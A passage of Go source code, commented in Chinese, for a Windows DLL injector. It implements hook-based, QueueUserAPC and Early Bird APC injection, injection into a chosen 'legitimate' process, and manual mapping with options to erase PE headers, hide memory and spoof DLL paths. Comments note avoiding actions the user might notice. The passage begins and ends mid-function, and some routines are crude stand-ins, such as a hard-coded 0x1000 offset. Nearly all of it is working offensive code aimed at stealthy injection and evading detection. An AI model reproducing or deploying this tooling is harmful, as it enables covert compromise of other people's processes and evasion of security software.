		dllFileName = dllPath[lastSlash+1:]
	} else {
		dllFileName = dllPath
	}

	for {
		moduleName := windows.UTF16ToString(me.Module[:])
		if strings.EqualFold(moduleName, dllFileName) {
			i.logger.Info("Found module in target process", "module_name", moduleName, "base_address", fmt.Sprintf("0x%X", me.ModBaseAddr))
			return windows.Handle(me.ModBaseAddr), nil
		}

		// 获取下一个模块
		err = windows.Module32Next(hSnapshot, &me)
		if err != nil {
			if err == windows.ERROR_NO_MORE_FILES {
				break
			}
			return 0, errors.New("Failed to enumerate modules: " + err.Error())
		}
	}

	return 0, errors.New("Module not found in target process")
}

// getHookProcAddressInProcess 获取目标进程中的钩子过程地址
func (i *Injector) getHookProcAddressInProcess(processID uint32, hModule windows.Handle) (uintptr, error) {
	// 这里我们需要解析目标进程中的PE文件来找到导出函数
	// 为了简化，我们假设钩子过程名为"HookProc"

	// 在实际实现中，需要：
	// 1. 读取目标进程中的PE头
	// 2. 解析导出表
	// 3. 找到钩子过程的RVA
	// 4. 计算实际地址

	// 简化实现：假设HookProc是第一个导出函数，偏移为0x1000
	hookProcAddr := uintptr(hModule) + 0x1000

	i.logger.Info("Calculated hook procedure address", "address", fmt.Sprintf("0x%X", hookProcAddr))
	return hookProcAddr, nil
}

// setHookWithAddress 使用指定地址设置钩子
func (i *Injector) setHookWithAddress(threadID uint32, hModule windows.Handle, hookProcAddr uintptr) error {
	// 加载user32.dll
	user32 := windows.NewLazySystemDLL("user32.dll")
	setWindowsHookEx := user32.NewProc("SetWindowsHookExW")
	unhookWindowsHookEx := user32.NewProc("UnhookWindowsHookEx")

	// 尝试设置CBT钩子（最安全）
	const WH_CBT = 5
	r1, _, err := setWindowsHookEx.Call(
		WH_CBT,
		hookProcAddr,
		uintptr(hModule),
		uintptr(threadID))

	if r1 == 0 {
		return errors.New("Failed to set Windows hook: " + err.Error())
	}

	hHook := windows.Handle(r1)
	i.logger.Info("Successfully set Windows hook", "hook_handle", hHook, "thread_id", threadID)

	// 触发钩子执行
	err = i.triggerCBTHook(threadID)
	if err != nil {
		i.logger.Warn("Failed to trigger hook", "error", err)
	}

	// 等待一段时间让钩子执行
	i.logger.Info("Waiting for hook execution...")
	time.Sleep(3 * time.Second)

	// 移除钩子
	r2, _, err := unhookWindowsHookEx.Call(uintptr(hHook))
	if r2 == 0 {
		i.logger.Warn("Failed to unhook Windows hook", "error", err)
	} else {
		i.logger.Info("Successfully removed Windows hook")
	}

	return nil
}

// createInMemoryHookDll 创建内存中的钩子DLL
func (i *Injector) createInMemoryHookDll() ([]byte, error) {
	// 这里应该创建一个最小的DLL，包含钩子过程
	// 为了简化，我们读取原始DLL文件
	dllBytes, err := os.ReadFile(i.dllPath)
	if err != nil {
		return nil, errors.New("Failed to read DLL file: " + err.Error())
	}

	i.logger.Info("Created in-memory hook DLL", "size", len(dllBytes))
	return dllBytes, nil
}

// injectHookDllToProcess 将钩子DLL注入到进程
func (i *Injector) injectHookDllToProcess(dllBytes []byte) error {
	// 使用手动映射将DLL注入到目标进程
	if i.bypassOptions.ManualMapping {
		// 创建bypass选项
		options := BypassOptions{
			InvisibleMemory: i.bypassOptions.InvisibleMemory,
			ErasePEHeader:   i.bypassOptions.ErasePEHeader,
			EraseEntryPoint: i.bypassOptions.EraseEntryPoint,
		}
		return ManualMapDLL(i.processID, dllBytes, options)
	}

	// 使用标准注入方法
	return i.memoryLoadDLL(dllBytes)
}

// createGlobalHookProcess 创建全局钩子进程
func (i *Injector) createGlobalHookProcess() error {
	// 全局钩子注入方法比较复杂且容易失败
	// 为了避免误报成功，我们直接返回一个明确的错误
	// 表明这个方法当前不可用，但前面的方法可能已经成功了

	i.logger.Info("Global hook injection method is not fully implemented")
	i.logger.Info("This is expected - previous methods may have already succeeded")

	// 返回一个特殊的错误，表明这不是真正的失败
	return errors.New("Global hook method skipped - not a critical failure")
}

// getMainThreadID 获取进程的主线程ID
func (i *Injector) getMainThreadID(processID uint32) (uint32, error) {
	// 创建线程快照
	hSnapshot, err := windows.CreateToolhelp32Snapshot(windows.TH32CS_SNAPTHREAD, 0)
	if err != nil {
		return 0, errors.New("Failed to create thread snapshot: " + err.Error())
	}
	defer windows.CloseHandle(hSnapshot)

	// 遍历线程
	var te windows.ThreadEntry32
	te.Size = uint32(unsafe.Sizeof(te))
	err = windows.Thread32First(hSnapshot, &te)
	if err != nil {
		return 0, errors.New("Failed to get first thread: " + err.Error())
	}

	var mainThreadID uint32
	var earliestCreationTime uint64 = ^uint64(0) // 最大值

	for {
		if te.OwnerProcessID == processID {
			// 打开线程以获取创建时间
			hThread, err := windows.OpenThread(windows.THREAD_QUERY_INFORMATION, false, te.ThreadID)
			if err == nil {
				// 获取线程创建时间
				kernel32 := windows.NewLazySystemDLL("kernel32.dll")
				getThreadTimes := kernel32.NewProc("GetThreadTimes")

				var creationTime, exitTime, kernelTime, userTime windows.Filetime
				r1, _, _ := getThreadTimes.Call(
					uintptr(hThread),
					uintptr(unsafe.Pointer(&creationTime)),
					uintptr(unsafe.Pointer(&exitTime)),
					uintptr(unsafe.Pointer(&kernelTime)),
					uintptr(unsafe.Pointer(&userTime)))

				if r1 != 0 {
					threadCreationTime := uint64(creationTime.HighDateTime)<<32 + uint64(creationTime.LowDateTime)
					if threadCreationTime < earliestCreationTime {
						earliestCreationTime = threadCreationTime
						mainThreadID = te.ThreadID
					}
				}
				windows.CloseHandle(hThread)
			}
		}

		// 获取下一个线程
		err = windows.Thread32Next(hSnapshot, &te)
		if err != nil {
			if err == windows.ERROR_NO_MORE_FILES {
				break
			}
			return 0, errors.New("Failed to enumerate threads: " + err.Error())
		}
	}

	if mainThreadID == 0 {
		return 0, errors.New("No threads found for process")
	}

	return mainThreadID, nil
}

// validateDllForHookInjection 验证DLL是否适合钩子注入
func (i *Injector) validateDllForHookInjection() error {
	// 检查DLL文件是否存在
	if _, err := os.Stat(i.dllPath); err != nil {
		return errors.New("DLL file does not exist: " + i.dllPath)
	}

	// 尝试加载DLL到当前进程进行验证
	kernel32 := windows.NewLazySystemDLL("kernel32.dll")
	loadLibrary := kernel32.NewProc("LoadLibraryW")
	getProcAddress := kernel32.NewProc("GetProcAddress")

	dllPathUTF16, err := windows.UTF16PtrFromString(i.dllPath)
	if err != nil {
		return errors.New("Failed to convert DLL path to UTF16: " + err.Error())
	}

	r1, _, err := loadLibrary.Call(uintptr(unsafe.Pointer(dllPathUTF16)))
	if r1 == 0 {
		return errors.New("Failed to load DLL for validation: " + err.Error())
	}
	hModule := windows.Handle(r1)
	defer windows.FreeLibrary(hModule)

	// 检查是否有合适的导出函数
	_, _, err = i.findHookProcedure(hModule, getProcAddress)
	if err != nil {
		return errors.New("DLL does not contain suitable hook procedure: " + err.Error())
	}

	i.logger.Info("DLL validation passed")
	return nil
}

// findHookProcedure 查找合适的钩子过程函数
func (i *Injector) findHookProcedure(hModule windows.Handle, getProcAddress *windows.LazyProc) (uintptr, string, error) {
	// 按优先级尝试不同的导出函数名
	hookProcNames := []string{
		"HookProc",             // 标准钩子过程名
		"GetMsgProc",           // 消息钩子过程
		"CBTProc",              // CBT钩子过程
		"KeyboardProc",         // 键盘钩子过程
		"MouseProc",            // 鼠标钩子过程
		"LowLevelKeyboardProc", // 低级键盘钩子过程
		"LowLevelMouseProc",    // 低级鼠标钩子过程
		"WndProc",              // 窗口过程（有时可以用作钩子）
		"DllMain",              // DLL主函数（最后尝试）
	}

	for _, procName := range hookProcNames {
		hookProcNameBytes, _ := windows.BytePtrFromString(procName)
		r2, _, err := getProcAddress.Call(uintptr(hModule), uintptr(unsafe.Pointer(hookProcNameBytes)))
		if r2 != 0 {
			i.logger.Info("Found hook procedure", "function_name", procName, "address", fmt.Sprintf("0x%X", r2))

			// 验证函数地址是否有效
			if i.validateHookProcedure(uintptr(r2)) {
				return uintptr(r2), procName, nil
			} else {
				i.logger.Warn("Hook procedure address validation failed", "function_name", procName)
			}
		} else {
			i.logger.Debug("Hook procedure not found", "function_name", procName, "error", err)
		}
	}

	return 0, "", errors.New("No suitable hook procedure found in DLL")
}

// validateHookProcedure 验证钩子过程函数地址是否有效
func (i *Injector) validateHookProcedure(procAddr uintptr) bool {
	// 基本地址验证
	if procAddr == 0 {
		return false
	}

	// 检查地址是否在合理范围内（用户空间）
	if procAddr < 0x10000 || procAddr > 0x7FFFFFFF {
		i.logger.Debug("Hook procedure address out of user space range", "address", fmt.Sprintf("0x%X", procAddr))
		return false
	}

	// 可以添加更多验证，比如检查内存是否可读等
	// 但为了简单起见，这里只做基本验证

	return true
}

// triggerHook 触发钩子执行
func (i *Injector) triggerHook(threadID uint32) error {
	user32 := windows.NewLazySystemDLL("user32.dll")
	postThreadMessage := user32.NewProc("PostThreadMessageW")

	const WM_NULL = 0
	r1, _, err := postThreadMessage.Call(
		uintptr(threadID),
		WM_NULL,
		0,
		0)

	if r1 == 0 {
		return errors.New("Failed to post thread message: " + err.Error())
	}

	return nil
}

// triggerHookAdvanced 根据钩子类型触发钩子执行
func (i *Injector) triggerHookAdvanced(threadID uint32, hookType string) error {
	switch hookType {
	case "WH_CBT":
		// CBT钩子通过窗口操作触发
		return i.triggerCBTHook(threadID)
	case "WH_GETMESSAGE":
		// 消息钩子通过发送消息触发
		return i.triggerMessageHook(threadID)
	case "WH_KEYBOARD_LL":
		// 低级键盘钩子通过键盘输入触发
		return i.triggerKeyboardHook()
	case "WH_MOUSE_LL":
		// 低级鼠标钩子通过鼠标移动触发
		return i.triggerMouseHook()
	default:
		// 默认使用消息触发
		return i.triggerHook(threadID)
	}
}

// triggerCBTHook 触发CBT钩子
func (i *Injector) triggerCBTHook(threadID uint32) error {
	user32 := windows.NewLazySystemDLL("user32.dll")
	postThreadMessage := user32.NewProc("PostThreadMessageW")

	// 发送窗口相关消息来触发CBT钩子
	const WM_ACTIVATEAPP = 0x001C
	r1, _, err := postThreadMessage.Call(
		uintptr(threadID),
		WM_ACTIVATEAPP,
		1, // wParam: TRUE (activating)
		0) // lParam: thread ID of deactivated app

	if r1 == 0 {
		return errors.New("Failed to trigger CBT hook: " + err.Error())
	}

	i.logger.Info("CBT hook triggered")
	return nil
}

// triggerMessageHook 触发消息钩子
func (i *Injector) triggerMessageHook(threadID uint32) error {
	user32 := windows.NewLazySystemDLL("user32.dll")
	postThreadMessage := user32.NewProc("PostThreadMessageW")

	// 发送多种消息来确保钩子被触发
	messages := []uint32{
		0x0000, // WM_NULL
		0x0001, // WM_CREATE
		0x0113, // WM_TIMER
	}

	for _, msg := range messages {
		r1, _, err := postThreadMessage.Call(
			uintptr(threadID),
			uintptr(msg),
			0,
			0)

		if r1 != 0 {
			i.logger.Info("Message hook triggered", "message", msg)
			return nil
		} else {
			i.logger.Debug("Failed to send message", "message", msg, "error", err)
		}
	}

	return errors.New("Failed to trigger message hook")
}

// triggerKeyboardHook 触发键盘钩子
func (i *Injector) triggerKeyboardHook() error {
	// 对于低级键盘钩子，我们不主动触发，因为这可能导致系统不稳定
	// 低级钩子是全局的，会在任何键盘输入时自动触发
	i.logger.Info("Low-level keyboard hook installed, will trigger on next keyboard input")

	// 等待一段时间让用户进行键盘输入，或者系统自然产生键盘事件
	time.Sleep(1 * time.Second)

	return nil
}

// triggerMouseHook 触发鼠标钩子
func (i *Injector) triggerMouseHook() error {
	// 对于低级鼠标钩子，我们不主动移动鼠标，因为这可能被用户察觉
	// 低级钩子是全局的，会在任何鼠标活动时自动触发
	i.logger.Info("Low-level mouse hook installed, will trigger on next mouse movement")

	// 等待一段时间让用户进行鼠标操作，或者系统自然产生鼠标事件
	time.Sleep(1 * time.Second)

	return nil
}

// apcInject 使用QueueUserAPC进行注入
func (i *Injector) apcInject() error {
	// 检查参数是否有效
	if err := i.checkDllPath(); err != nil {
		return err
	}

	if err := i.checkProcessID(); err != nil {
		return err
	}

	i.logger.Info("Starting QueueUserAPC injection")

	// 打开目标进程
	hProcess, err := windows.OpenProcess(
		windows.PROCESS_CREATE_THREAD|
			windows.PROCESS_VM_OPERATION|
			windows.PROCESS_VM_WRITE|
			windows.PROCESS_VM_READ|
			windows.PROCESS_QUERY_INFORMATION,
		false, i.processID)
	if err != nil {
		errMsg := "Failed to open target process: " + err.Error()
		newErr := errors.New(errMsg)
		i.logger.Error("APC injection failed", "error", newErr)
		return newErr
	}
	defer windows.CloseHandle(hProcess)

	// 在目标进程中分配内存存储DLL路径
	dllPathBytes := append([]byte(i.dllPath), 0) // 添加NULL终止符
	dllPathSize := uintptr(len(dllPathBytes))

	remoteDllPath, err := VirtualAllocEx(hProcess, 0, dllPathSize,
		windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_READWRITE)
	if err != nil {
		errMsg := "Failed to allocate memory in target process: " + err.Error()
		newErr := errors.New(errMsg)
		i.logger.Error("APC injection failed", "error", newErr)
		return newErr
	}
	defer VirtualFreeEx(hProcess, remoteDllPath, 0, windows.MEM_RELEASE)

	// 写入DLL路径到远程进程内存
	var bytesWritten uintptr
	err = WriteProcessMemory(hProcess, remoteDllPath, unsafe.Pointer(&dllPathBytes[0]),
		dllPathSize, &bytesWritten)
	if err != nil {
		errMsg := "Failed to write DLL path to target process memory: " + err.Error()
		newErr := errors.New(errMsg)
		i.logger.Error("APC injection failed", "error", newErr)
		return newErr
	}

	// 获取LoadLibraryA地址
	kernel32 := windows.NewLazySystemDLL("kernel32.dll")
	loadLibraryA := kernel32.NewProc("LoadLibraryA")
	loadLibraryAddr := loadLibraryA.Addr()

	// 获取目标进程的可警告线程
	threadIDs, err := i.getAllAlertableThreads(i.processID)
	if err != nil {
		errMsg := "Failed to find alertable threads: " + err.Error()
		newErr := errors.New(errMsg)
		i.logger.Error("APC injection failed", "error", newErr)
		return newErr
	}

	if len(threadIDs) == 0 {
		errMsg := "No alertable threads found in target process"
		newErr := errors.New(errMsg)
		i.logger.Error("APC injection failed", "error", newErr)
		return newErr
	}

	i.logger.Info("Found alertable threads", "count", len(threadIDs))

	// 尝试向多个线程队列APC以提高成功率
	var successCount int
	for _, threadID := range threadIDs {
		// 打开线程，需要SET_CONTEXT权限来队列APC
		hThread, err := windows.OpenThread(windows.THREAD_SET_CONTEXT, false, threadID)
		if err != nil {
			i.logger.Warn("Failed to open thread", "thread_id", threadID, "error", err)
			continue
		}

		// 使用QueueUserAPC
		queueUserAPC := kernel32.NewProc("QueueUserAPC")
		r1, _, err := queueUserAPC.Call(
			loadLibraryAddr,
			uintptr(hThread),
			remoteDllPath)

		if r1 != 0 {
			i.logger.Info("Successfully queued APC", "thread_id", threadID)
			successCount++

			// 尝试唤醒线程以执行APC
			err = i.alertThreadAdvanced(threadID, hThread)
			if err != nil {
				i.logger.Warn("Failed to alert thread", "thread_id", threadID, "error", err)
			}
		} else {
			i.logger.Warn("Failed to queue APC", "thread_id", threadID, "error", err)
		}

		windows.CloseHandle(hThread)
	}

	if successCount == 0 {
		errMsg := "Failed to queue APC to any thread"
		newErr := errors.New(errMsg)
		i.logger.Error("APC injection failed", "error", newErr)
		return newErr
	}

	i.logger.Info("APC injection completed", "successful_threads", successCount)

	// 等待一段时间让APC执行
	i.logger.Info("Waiting for APC execution...")
	time.Sleep(3 * time.Second)

	return nil
}

// getAllAlertableThreads 获取所有可警告的线程
func (i *Injector) getAllAlertableThreads(processID uint32) ([]uint32, error) {
	// 创建线程快照
	hSnapshot, err := windows.CreateToolhelp32Snapshot(windows.TH32CS_SNAPTHREAD, 0)
	if err != nil {
		return nil, errors.New("Failed to create thread snapshot: " + err.Error())
	}
	defer windows.CloseHandle(hSnapshot)

	// 遍历线程
	var te windows.ThreadEntry32
	te.Size = uint32(unsafe.Sizeof(te))
	err = windows.Thread32First(hSnapshot, &te)
	if err != nil {
		return nil, errors.New("Failed to get first thread: " + err.Error())
	}

	var alertableThreads []uint32
	for {
		if te.OwnerProcessID == processID {
			// 尝试打开线程检查是否可以设置上下文
			hThread, err := windows.OpenThread(windows.THREAD_SET_CONTEXT, false, te.ThreadID)
			if err == nil {
				// 检查线程状态，优先选择等待状态的线程
				if i.isThreadInAlertableState(hThread) {
					alertableThreads = append(alertableThreads, te.ThreadID)
				}
				windows.CloseHandle(hThread)
			}
		}

		// 获取下一个线程
		err = windows.Thread32Next(hSnapshot, &te)
		if err != nil {
			if err == windows.ERROR_NO_MORE_FILES {
				break
			}
			return nil, errors.New("Failed to enumerate threads: " + err.Error())
		}
	}

	// 如果没有找到处于可警告状态的线程，返回所有可以打开的线程
	if len(alertableThreads) == 0 {
		err = windows.Thread32First(hSnapshot, &te)
		if err != nil {
			return nil, errors.New("Failed to get first thread: " + err.Error())
		}

		for {
			if te.OwnerProcessID == processID {
				hThread, err := windows.OpenThread(windows.THREAD_SET_CONTEXT, false, te.ThreadID)
				if err == nil {
					alertableThreads = append(alertableThreads, te.ThreadID)
					windows.CloseHandle(hThread)
				}
			}

			err = windows.Thread32Next(hSnapshot, &te)
			if err != nil {
				if err == windows.ERROR_NO_MORE_FILES {
					break
				}
				return nil, errors.New("Failed to enumerate threads: " + err.Error())
			}
		}
	}

	return alertableThreads, nil
}

// isThreadInAlertableState 检查线程是否处于可警告状态
func (i *Injector) isThreadInAlertableState(hThread windows.Handle) bool {
	// 获取线程上下文来检查线程状态
	// 这是一个简化的检查，实际的可警告状态检查更复杂

	// 尝试获取线程的基本信息
	ntdll := windows.NewLazySystemDLL("ntdll.dll")
	ntQueryInformationThread := ntdll.NewProc("NtQueryInformationThread")

	// 线程基本信息结构
	type THREAD_BASIC_INFORMATION struct {
		ExitStatus     int32
		TebBaseAddress uintptr
		ClientId       struct {
			UniqueProcess uintptr
			UniqueThread  uintptr
		}
		AffinityMask uintptr
		Priority     int32
		BasePriority int32
	}

	var threadInfo THREAD_BASIC_INFORMATION
	r1, _, _ := ntQueryInformationThread.Call(
		uintptr(hThread),
		0, // ThreadBasicInformation
		uintptr(unsafe.Pointer(&threadInfo)),
		unsafe.Sizeof(threadInfo),
		0,
	)

	// 如果能成功获取线程信息，认为线程是可用的
	return r1 == 0
}

// getAlertableThread 获取可警告的线程（保持向后兼容）
func (i *Injector) getAlertableThread(processID uint32) (uint32, error) {
	threads, err := i.getAllAlertableThreads(processID)
	if err != nil {
		return 0, err
	}
	if len(threads) == 0 {
		return 0, errors.New("No alertable thread found")
	}
	return threads[0], nil
}

// alertThreadAdvanced 使用多种方法尝试唤醒线程执行APC
func (i *Injector) alertThreadAdvanced(threadID uint32, hThread windows.Handle) error {
	i.logger.Debug("Attempting to alert thread for APC execution", "thread_id", threadID)

	// 方法1: 使用PostThreadMessage发送消息
	user32 := windows.NewLazySystemDLL("user32.dll")
	postThreadMessage := user32.NewProc("PostThreadMessageW")

	messages := []uint32{
		0x0000, // WM_NULL
		0x0001, // WM_CREATE
		0x0113, // WM_TIMER
		0x0400, // WM_USER
	}

	var messageSuccess bool
	for _, msg := range messages {
		r1, _, _ := postThreadMessage.Call(
			uintptr(threadID),
			uintptr(msg),
			0,
			0)
		if r1 != 0 {
			i.logger.Debug("Successfully posted thread message", "thread_id", threadID, "message", msg)
			messageSuccess = true
			break
		}
	}

	// 方法2: 尝试使用NtAlertThread直接唤醒线程
	ntdll := windows.NewLazySystemDLL("ntdll.dll")
	ntAlertThread := ntdll.NewProc("NtAlertThread")

	r2, _, _ := ntAlertThread.Call(uintptr(hThread))
	if r2 == 0 {
		i.logger.Debug("Successfully alerted thread using NtAlertThread", "thread_id", threadID)
		return nil
	}

	// 方法3: 尝试使用SetEvent如果线程在等待事件
	kernel32 := windows.NewLazySystemDLL("kernel32.dll")

	// 尝试短暂挂起和恢复线程来触发APC执行
	suspendThread := kernel32.NewProc("SuspendThread")
	resumeThread := kernel32.NewProc("ResumeThread")

	// 挂起线程
	suspendCount, _, _ := suspendThread.Call(uintptr(hThread))
	if suspendCount != ^uintptr(0) { // 如果挂起成功
		i.logger.Debug("Thread suspended", "thread_id", threadID, "suspend_count", suspendCount)

		// 立即恢复线程，这可能会触发APC执行
		time.Sleep(10 * time.Millisecond) // 短暂延迟
		resumeCount, _, _ := resumeThread.Call(uintptr(hThread))
		if resumeCount != ^uintptr(0) {
			i.logger.Debug("Thread resumed", "thread_id", threadID, "resume_count", resumeCount)
			return nil
		}
	}

	// 如果所有方法都失败，至少确保发送了消息
	if messageSuccess {
		return nil
	}

	return errors.New("Failed to alert thread using any method")
}

// alertThread 尝试唤醒线程执行APC（保持向后兼容）
func (i *Injector) alertThread(threadID uint32) error {
	// 定义线程访问权限常量
	const THREAD_SUSPEND_RESUME = 0x0002

	// 打开线程以获取句柄
	hThread, err := windows.OpenThread(THREAD_SUSPEND_RESUME, false, threadID)
	if err != nil {
		// 如果无法获取挂起/恢复权限，尝试基本的消息发送
		user32 := windows.NewLazySystemDLL("user32.dll")
		postThreadMessage := user32.NewProc("PostThreadMessageW")

		const WM_NULL = 0
		r1, _, err := postThreadMessage.Call(
			uintptr(threadID),
			WM_NULL,
			0,
			0)

		if r1 == 0 {
			return errors.New("Failed to post thread message: " + err.Error())
		}
		return nil
	}
	defer windows.CloseHandle(hThread)

	return i.alertThreadAdvanced(threadID, hThread)
}

// legitProcessInject 使用合法进程注入
func (i *Injector) legitProcessInject() error {
	// 检查DLL路径是否有效
	if err := i.checkDllPath(); err != nil {
		return err
	}

	// 查找合法进程
	i.logger.Info("开始查找合法进程进行注入")
	targetPID, targetName, err := FindLegitProcess()
	if err != nil {
		errMsg := "查找合法进程失败: " + err.Error()
		newErr := errors.New(errMsg)
		i.logger.Error("Legitimate process injection failed", "error", newErr)
		return newErr
	}

	i.logger.Info("使用合法进程进行注入",
		"target_name", targetName,
		"target_pid", targetPID)

	// 保存原始PID
	originalPID := i.processID

	// 临时修改目标进程ID为合法进程ID
	i.processID = targetPID

	// 检查目标进程是否可访问
	hProcess, err := windows.OpenProcess(
		windows.PROCESS_CREATE_THREAD|
			windows.PROCESS_VM_OPERATION|
			windows.PROCESS_VM_WRITE|
			windows.PROCESS_VM_READ|
			windows.PROCESS_QUERY_INFORMATION,
		false, i.processID)

	if err != nil {
		// 恢复原始PID
		i.processID = originalPID
		errMsg := "无法访问合法进程 " + targetName + " (PID: " + strconv.FormatUint(uint64(targetPID), 10) + "): " + err.Error()
		newErr := errors.New(errMsg)
		i.logger.Error("Legitimate process injection failed", "error", newErr)
		return newErr
	}
	windows.CloseHandle(hProcess)

	i.logger.Info("成功打开合法进程，准备注入")

	// 执行注入
	var injectionErr error
	if i.bypassOptions.MemoryLoad {
		// 读取DLL文件
		i.logger.Info("从内存加载DLL文件", "path", i.dllPath)
		dllBytes, err := os.ReadFile(i.dllPath)
		if err != nil {
			i.processID = originalPID
			errMsg := "读取DLL文件失败: " + err.Error()
			newErr := errors.New(errMsg)
			i.logger.Error("Legitimate process injection failed", "error", newErr)
			return newErr
		}
		i.logger.Info("成功读取DLL文件", "size", len(dllBytes))

		// 使用手动映射或内存加载
		if i.bypassOptions.ManualMapping {
			i.logger.Info("使用手动映射方式注入到合法进程")
			injectionErr = i.manualMapDLL(dllBytes)
		} else {
			i.logger.Info("使用内存加载方式注入到合法进程")
			injectionErr = i.memoryLoadDLL(dllBytes)
		}
	} else {
		// 从磁盘加载
		if i.bypassOptions.PathSpoofing {
			i.logger.Info("使用路径伪装方式从磁盘加载DLL到合法进程")
			injectionErr = i.diskLoadDLLWithSpoofing()
		} else {
			i.logger.Info("使用标准方式从磁盘加载DLL到合法进程")
			injectionErr = i.diskLoadDLL()
		}
	}

	// 恢复原始PID
	i.processID = originalPID

	if injectionErr != nil {
		errMsg := "通过合法进程 " + targetName + " (PID: " + strconv.FormatUint(uint64(targetPID), 10) + ") 注入失败: " + injectionErr.Error()
		newErr := errors.New(errMsg)
		i.logger.Error("Legitimate process injection failed", "error", newErr)
		return newErr
	}

	i.logger.Info("成功通过合法进程注入DLL",
		"target_name", targetName,
		"target_pid", targetPID)
	return nil
}

// earlyBirdAPCInject 使用Early Bird APC的注入方法
func (i *Injector) earlyBirdAPCInject() error {
	// 检查DLL路径是否有效
	if err := i.checkDllPath(); err != nil {
		return err
	}

	// Early Bird APC注入需要创建一个新进程并挂起，然后在其主线程中注入APC
	// 创建进程并挂起
	i.logger.Info("准备执行Early Bird APC注入")

	// 获取要执行的进程路径
	var procPath string
	var err error

	// 如果是路径伪装，先伪装DLL
	dllPath := i.dllPath
	if i.bypassOptions.PathSpoofing {
		dllPath = i.spoofDllPath()
		defer func() {
			if dllPath != i.dllPath {
				os.Remove(dllPath)
			}
		}()
	}

	// 获取当前进程可执行文件路径
	if i.processID > 0 {
		procPath, err = getProcessPathByPID(i.processID)
		if err != nil {
			errMsg := "获取目标进程路径失败: " + err.Error()
			newErr := errors.New(errMsg)
			i.logger.Error("Early Bird APC injection failed", "error", newErr)
			return newErr
		}
	} else {
		// 如果没有指定PID，使用notepad.exe
		procPath, err = getSystemProgramPath("notepad.exe")
		if err != nil {
			errMsg := "获取notepad.exe路径失败: " + err.Error()
			newErr := errors.New(errMsg)
			i.logger.Error("Early Bird APC injection failed", "error", newErr)
			return newErr
		}
	}

	i.logger.Info("目标进程路径", "path", procPath)

	// 决定加载方式
	if i.bypassOptions.MemoryLoad {
		// 从内存加载DLL
		dllBytes, err := os.ReadFile(dllPath)
		if err != nil {
			errMsg := "读取DLL文件失败: " + err.Error()
			newErr := errors.New(errMsg)
			i.logger.Error("Early Bird APC injection failed", "error", newErr)
			return newErr
		}

		// 使用早期鸟内存加载
		return i.earlyBirdMemoryInject(procPath, dllBytes)
	}

	// 从磁盘加载的早期鸟注入
	return i.earlyBirdDiskInject(procPath, dllPath)
}

// executeDllEntry 执行DLL入口点
func (i *Injector) executeDllEntry(hProcess windows.Handle, baseAddress uintptr, peHeader *PEHeader) error {
	// 计算入口点地址
	entryPointRVA := peHeader.OptionalHeader.AddressOfEntryPoint
	if entryPointRVA == 0 {
		// 没有入口点，直接返回成功
		return nil
	}

	entryPointAddr := baseAddress + uintptr(entryPointRVA)

	// 创建远程线程执行入口点
	var threadID uint32
	threadHandle, err := CreateRemoteThread(hProcess, nil, 0, entryPointAddr, baseAddress, 0, &threadID)
	if err != nil {
		return errors.New("Failed to create thread for DLL entry point: " + err.Error())
	}
	defer windows.CloseHandle(threadHandle)

	// 等待线程执行完成
	windows.WaitForSingleObject(threadHandle, windows.INFINITE)

	return nil
}

// getProcessPathByPID 根据PID获取进程路径（内部使用）
func getProcessPathByPID(pid uint32) (string, error) {
	// 打开进程
	hProcess, err := windows.OpenProcess(windows.PROCESS_QUERY_INFORMATION|windows.PROCESS_VM_READ, false, pid)
	if err != nil {
		return "", errors.New("Failed to open process: " + err.Error())
	}
	defer windows.CloseHandle(hProcess)

	// 获取进程路径
	var pathBuffer [windows.MAX_PATH]uint16
	var pathSize uint32 = windows.MAX_PATH

	kernel32 := windows.NewLazySystemDLL("kernel32.dll")
	queryFullProcessImageName := kernel32.NewProc("QueryFullProcessImageNameW")

	r1, _, err := queryFullProcessImageName.Call(
		uintptr(hProcess),
		0, // dwFlags
		uintptr(unsafe.Pointer(&pathBuffer[0])),
		uintptr(unsafe.Pointer(&pathSize)))

	if r1 == 0 {
		return "", errors.New("Failed to get process path: " + err.Error())
	}

	return windows.UTF16ToString(pathBuffer[:pathSize]), nil
}

// getSystemProgramPath 获取系统程序路径
func getSystemProgramPath(programName string) (string, error) {
	// 获取系统目录
	systemDir, err := windows.GetSystemDirectory()
	if err != nil {
		return "", errors.New("Failed to get system directory: " + err.Error())
	}

	programPath := systemDir + "\\" + programName

	// 检查文件是否存在
	_, err = os.Stat(programPath)
	if err != nil {
		return "", errors.New("Program not found: " + err.Error())
	}

	return programPath, nil
}

// earlyBirdDiskInject 从磁盘执行早期鸟注入
func (i *Injector) earlyBirdDiskInject(targetPath string, dllPath string) error {
	i.logger.Info("Starting Early Bird disk injection", "target_path", targetPath, "dll_path", dllPath)

	// 创建挂起的进程
	si := windows.StartupInfo{}
	pi := windows.ProcessInformation{}
	si.Cb = uint32(unsafe.Sizeof(si))

	// 构建命令行
	cmdLine, err := windows.UTF16PtrFromString(targetPath)
	if err != nil {
		return errors.New("Failed to convert command line to UTF16: " + err.Error())
	}

	// 创建挂起的进程
	err = windows.CreateProcess(
		nil,
		cmdLine,
		nil,
		nil,
		false,
		windows.CREATE_SUSPENDED, // 创建挂起状态的进程
		nil,
		nil,
		&si,
		&pi)

	if err != nil {
		return errors.New("Failed to create suspended process: " + err.Error())
	}

	// 确保在函数结束时清理资源
	defer func() {
		windows.CloseHandle(pi.Thread)
		windows.CloseHandle(pi.Process)
	}()

	i.logger.Info("Created suspended process", "pid", pi.ProcessId, "tid", pi.ThreadId)

	// 在新进程中分配内存存储DLL路径
	dllPathBytes := append([]byte(dllPath), 0) // 添加NULL终止符
	dllPathSize := uintptr(len(dllPathBytes))

	remoteDllPath, err := VirtualAllocEx(pi.Process, 0, dllPathSize,
		windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_READWRITE)
	if err != nil {
		windows.TerminateProcess(pi.Process, 1)
		return errors.New("Failed to allocate memory in target process: " + err.Error())
	}

	// 写入DLL路径到远程进程内存
	var bytesWritten uintptr
	err = WriteProcessMemory(pi.Process, remoteDllPath, unsafe.Pointer(&dllPathBytes[0]),
		dllPathSize, &bytesWritten)
	if err != nil {
		windows.TerminateProcess(pi.Process, 1)
		return errors.New("Failed to write DLL path to target process memory: " + err.Error())
	}

	// 获取LoadLibraryA地址
	kernel32 := windows.NewLazySystemDLL("kernel32.dll")
	loadLibraryA := kernel32.NewProc("LoadLibraryA")
	loadLibraryAddr := loadLibraryA.Addr()

	// 使用QueueUserAPC向主线程队列APC
	queueUserAPC := kernel32.NewProc("QueueUserAPC")
	r1, _, err := queueUserAPC.Call(
		loadLibraryAddr,
		uintptr(pi.Thread),
